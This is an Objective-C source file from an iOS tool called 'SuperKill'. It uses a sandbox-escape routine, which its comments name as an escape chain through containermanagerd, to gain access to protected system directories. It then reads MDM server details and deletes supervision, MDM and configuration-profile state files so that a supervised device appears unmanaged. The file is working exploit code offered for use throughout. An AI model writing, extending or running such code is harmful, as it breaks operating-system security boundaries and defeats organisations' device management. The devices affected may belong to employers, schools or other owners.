//
//  SKEngine.m
//  SuperKill
//

#import "SKEngine.h"
#import "worse_query.h"

#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <sys/stat.h>
#import <xpc/xpc.h>

NSString *const SKConfigurationProfilesRoot =
@"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles";
NSString *const SKDeviceManagementRoot = @"/private/var/mobile/Library/DeviceManagement";
NSString *const SKUserProfilesRoot = @"/private/var/mobile/Library/ConfigurationProfiles";

static NSString *const SKGroupDefaultsKey = @"SKAppGroup";
static NSString *const SKGroupUserSetKey = @"SKAppGroupUserSet";
static NSString *const SKGroupInfoKey = @"SKAppGroup";

#pragma mark - plist helpers

static BOOL SKWritePlist(id plist, NSString *path) {
    if (!plist || path.length == 0) return NO;
    NSError *error = nil;
    NSData *data = [NSPropertyListSerialization dataWithPropertyList:plist
                                                              format:NSPropertyListXMLFormat_v1_0
                                                             options:0
                                                               error:&error];
    if (!data) return NO;
    return [data writeToFile:path options:NSDataWritingAtomic error:&error];
}

static id SKReadPlist(NSString *path) {
    if (path.length == 0) return nil;
    NSData *data = [NSData dataWithContentsOfFile:path];
    if (!data) return nil;
    return [NSPropertyListSerialization propertyListWithData:data
                                                     options:NSPropertyListMutableContainersAndLeaves
                                                      format:NULL
                                                       error:NULL];
}

#pragma mark - SKEngine

@interface SKEngine ()
@property (nonatomic, strong) NSMutableDictionary<NSString *, NSNumber *> *handles;

- (void)log:(NSString *)format, ... NS_FORMAT_FUNCTION(1, 2);
- (BOOL)hasAccessTo:(NSString *)path;
- (BOOL)grantAccessTo:(NSString *)root;
- (NSString *)hintForCode:(int64_t)code;
- (NSArray<NSString *> *)entriesIn:(NSString *)root;
- (BOOL)removeItem:(NSString *)path;
- (void)emptyPayloadManifestIn:(NSString *)root;
@end

@implementation SKEngine

- (instancetype)init {
    if ((self = [super init])) {
        _handles = [NSMutableDictionary dictionary];
        _appGroup = [SKEngine configuredAppGroup];
    }
    return self;
}

+ (NSString *)appGroupFromEntitlements {
    // libxpc 导出 xpc_copy_entitlement_for_self()，用它读自己签名里的 app group，
    // 这样自签后不需要手输 group，也不会因为填错而报 -1。
    typedef xpc_object_t (*sk_copy_entitlement_fn)(const char *);
    sk_copy_entitlement_fn copy = (sk_copy_entitlement_fn)dlsym(RTLD_DEFAULT, "xpc_copy_entitlement_for_self");
    if (!copy) {
        void *libxpc = dlopen("/usr/lib/system/libxpc.dylib", RTLD_LAZY);
        if (libxpc) copy = (sk_copy_entitlement_fn)dlsym(libxpc, "xpc_copy_entitlement_for_self");
    }
    if (!copy) return nil;

    xpc_object_t value = copy("com.apple.security.application-groups");
    if (!value || xpc_get_type(value) != XPC_TYPE_ARRAY) return nil;

    NSFileManager *fm = [NSFileManager defaultManager];
    size_t count = xpc_array_get_count(value);
    for (size_t i = 0; i < count; i++) {
        const char *raw = xpc_array_get_string(value, i);
        if (!raw) continue;
        NSString *group = [NSString stringWithUTF8String:raw];
        // 只有真的拿到容器，才说明这个 group 在签名/描述文件里被认可
        if (group.length && [fm containerURLForSecurityApplicationGroupIdentifier:group]) {
            return group;
        }
    }
    return nil;
}

+ (NSString *)configuredAppGroup {
    NSString *detected = [self appGroupFromEntitlements];
    if (detected.length) return detected;

    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
    NSString *manual = [defaults stringForKey:SKGroupDefaultsKey];
    if ([defaults boolForKey:SKGroupUserSetKey] && manual.length) return manual;

    NSString *fallback = [[NSBundle mainBundle] objectForInfoDictionaryKey:SKGroupInfoKey];
    return fallback.length ? fallback : @"";
}

+ (void)setConfiguredAppGroup:(NSString *)group {
    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
    [defaults setObject:(group ?: @"") forKey:SKGroupDefaultsKey];
    [defaults setBool:YES forKey:SKGroupUserSetKey];
    [defaults synchronize];
}

- (void)log:(NSString *)format, ... NS_FORMAT_FUNCTION(1, 2) {
    va_list args;
    va_start(args, format);
    NSString *line = [[NSString alloc] initWithFormat:format arguments:args];
    va_end(args);
    SKLogBlock logger = self.logger;
    if (logger) logger(line);
}

#pragma mark - 扩展管理

- (BOOL)hasAccessTo:(NSString *)path {
    for (NSString *granted in self.handles) {
        if ([path isEqualToString:granted]) return YES;
        if ([path hasPrefix:[granted stringByAppendingString:@"/"]]) return YES;
    }
    return NO;
}

- (BOOL)grantAccessTo:(NSString *)root {
    if ([self hasAccessTo:root]) return YES;
    if (self.appGroup.length == 0) {
        [self log:@"✗ 没有配置 App Group，签名时必须注入 com.apple.security.application-groups"];
        return NO;
    }
    if (!sk_has_app_group(self.appGroup)) {
        [self log:@"✗ App Group 不可用：%@", self.appGroup];
        [self log:@"  说明：entitlements 里的 group 必须在你自己的开发者账号下注册过，并且随描述文件一起签名"];
        return NO;
    }
    int64_t flags = 0;
    int64_t handle = sk_escape(root, self.appGroup, false, &flags);
    if (handle <= 0) {
        [self log:@"✗ %@ 取得扩展失败（code %lld）%@",
              root.lastPathComponent, (long long)handle, [self hintForCode:handle]];
        return NO;
    }
    self.handles[root] = @(handle);
    [self log:@"✓ %@ 已拿到扩展 handle=%lld flags=0x%llx",
          root.lastPathComponent, (long long)handle, (unsigned long long)flags];
    return YES;
}

- (NSString *)hintForCode:(int64_t)code {
    switch (code) {
        case -1:  return @"App Group 无效";
        case -2:  return @"系统版本不支持（dylib 或符号缺失）";
        case -3:  return @"container_query 创建失败";
        case -4:  return @"符号链接创建失败";
        case -5:  return @"containermanagerd 拒绝 query（flags/part 不匹配）";
        case -6:  return @"内核拒绝签发扩展";
        case -255: return @"目标路径不存在";
        default: return @"";
    }
}

- (void)releaseAllExtensions {
    for (NSString *path in self.handles.allKeys) {
        sk_escape_release(self.handles[path].longLongValue);
        [self log:@"↺ 释放扩展 %@", path.lastPathComponent];
    }
    [self.handles removeAllObjects];
}

#pragma mark - 自检

- (NSString *)environmentReport {
    NSMutableString *out = [NSMutableString string];
    NSOperatingSystemVersion v = [NSProcessInfo processInfo].operatingSystemVersion;
    [out appendFormat:@"iOS: %ld.%ld.%ld\n", (long)v.majorVersion, (long)v.minorVersion, (long)v.patchVersion];
    [out appendFormat:@"App Group: %@\n", self.appGroup.length ? self.appGroup : @"(空)"];
    NSURL *groupURL = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:self.appGroup];
    [out appendFormat:@"Group 容器: %@\n", sk_has_app_group(self.appGroup) ? @"可访问" : @"不可访问"];
    if (groupURL) [out appendFormat:@"容器路径: %@\n", groupURL.path];

    // 主动探一次真实目标：能拿到扩展就说明整条逃逸链在你这个版本上成立
    BOOL cfg = [self grantAccessTo:SKConfigurationProfilesRoot];
    BOOL dev = [self grantAccessTo:SKDeviceManagementRoot];
    [out appendFormat:@"ConfigurationProfiles: %@\n", cfg ? @"扩展已取得（逃逸可用）" : @"扩展失败"];
    [out appendFormat:@"DeviceManagement: %@\n", dev ? @"扩展已取得" : @"不可用（未登记 MDM 时属正常）"];
    [out appendFormat:@"已持有句柄: %lu\n", (unsigned long)self.handles.count];

    // 当前监管状态（原“检测”按钮已合并进自检）
    if (cfg) {
        NSDictionary *cloud = SKReadPlist([SKConfigurationProfilesRoot stringByAppendingPathComponent:@"CloudConfigurationDetails.plist"]);
        if ([cloud isKindOfClass:[NSDictionary class]]) {
            BOOL supervised = [cloud[@"IsSupervised"] boolValue];
            [out appendFormat:@"监管: %@（IsSupervised = %d）· 组织 = %@\n",
             supervised ? @"受监管" : @"未监管", supervised, cloud[@"OrganizationName"] ?: @"(无)"];
        } else {
            [out appendString:@"监管: 未检测到监管标记\n"];
        }

        NSDictionary *mdm = SKReadPlist([SKConfigurationProfilesRoot stringByAppendingPathComponent:@"MDM.plist"]);
        if ([mdm isKindOfClass:[NSDictionary class]]) {
            [out appendFormat:@"MDM: %@ · Topic = %@\n",
             mdm[@"ServerURL"] ?: @"(无)", mdm[@"Topic"] ?: @"(无)"];
        }
    }
    return out;
}

- (NSArray<NSString *> *)entriesIn:(NSString *)root {
    NSError *error = nil;
    NSArray<NSString *> *list = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:root error:&error];
    if (!list) {
        [self log:@"  读取目录失败 %@: %@", root.lastPathComponent, error.localizedDescription];
        return @[];
    }
    return list;
}

#pragma mark - 清除

- (BOOL)removeItem:(NSString *)path {
    NSError *error = nil;
    if ([[NSFileManager defaultManager] fileExistsAtPath:path] == NO) return NO;
    BOOL ok = [[NSFileManager defaultManager] removeItemAtPath:path error:&error];
    [self log:@"%@ %@", ok ? @"− 删除" : @"✗ 删除失败", path.lastPathComponent];
    if (!ok && error) [self log:@"    %@", error.localizedDescription];
    return ok;
}

- (void)emptyPayloadManifestIn:(NSString *)root {
    NSString *path = [root stringByAppendingPathComponent:@"PayloadManifest.plist"];
    id manifest = SKReadPlist(path);
    if (![manifest isKindOfClass:[NSDictionary class]]) return;
    NSMutableDictionary *dict = [manifest mutableCopy];
    dict[@"OrderedProfiles"] = @[];
    if (SKWritePlist(dict, path)) {
        [self log:@"✓ PayloadManifest.OrderedProfiles 已清空"];
    }
}

- (BOOL)wipeSupervision:(BOOL)aggressive error:(NSError **)error {
    BOOL touched = NO;

    // 1. 监管 + MDM 主状态目录（systemgroup.com.apple.configurationprofiles）
    if ([self grantAccessTo:SKConfigurationProfilesRoot]) {
        NSArray<NSString *> *core = @[
            @"CloudConfigurationDetails.plist",
            @"CloudConfigurationSetAsideDetails.plist",
            @"MDM.plist",
            @"MDMEvents.plist",
            @"MDMAppManagement.plist",
            @"ProfileTruth.plist",
            @"Truth.plist",
            @"ClientTruth.plist",
        ];
        for (NSString *name in core) {
            [self removeItem:[SKConfigurationProfilesRoot stringByAppendingPathComponent:name]];
        }
        [self emptyPayloadManifestIn:SKConfigurationProfilesRoot];

        if (aggressive) {
            // 所有 GUID.stub 一并清掉，让 profiled 认为一个 profile 都没装过
            for (NSString *name in [self entriesIn:SKConfigurationProfilesRoot]) {
                if ([name.pathExtension isEqualToString:@"stub"]) {
                    [self removeItem:[SKConfigurationProfilesRoot stringByAppendingPathComponent:name]];
                }
            }
        }
        touched = YES;
    }

    // 2. 设备管理层状态（ClientTruth / MDM 副本）
    if ([self grantAccessTo:SKDeviceManagementRoot]) {
        NSArray<NSString *> *mgmt = @[
            @"ClientTruth.plist",
            @"CloudConfigurationDetails.plist",
            @"MDM.plist",
            @"MDMEvents.plist",
            @"MDMAppManagement.plist",
            @"ManagementState.plist",
        ];
        for (NSString *name in mgmt) {
            [self removeItem:[SKDeviceManagementRoot stringByAppendingPathComponent:name]];
        }
        touched = YES;
    }

    // 3. 用户级 profile 目录
    if (aggressive && [self grantAccessTo:SKUserProfilesRoot]) {
        for (NSString *name in [self entriesIn:SKUserProfilesRoot]) {
            [self removeItem:[SKUserProfilesRoot stringByAppendingPathComponent:name]];
        }
    }

    if (!touched) {
        if (error) {
            *error = [NSError errorWithDomain:@"SuperKill"
                                         code:1
                                     userInfo:@{NSLocalizedDescriptionKey: @"一个目标目录都没拿到访问权限"}];
        }
        return NO;
    }

    [self log:@"✓ 监管状态已清除：请保持断网并重启设备"];
    return YES;
}

@end
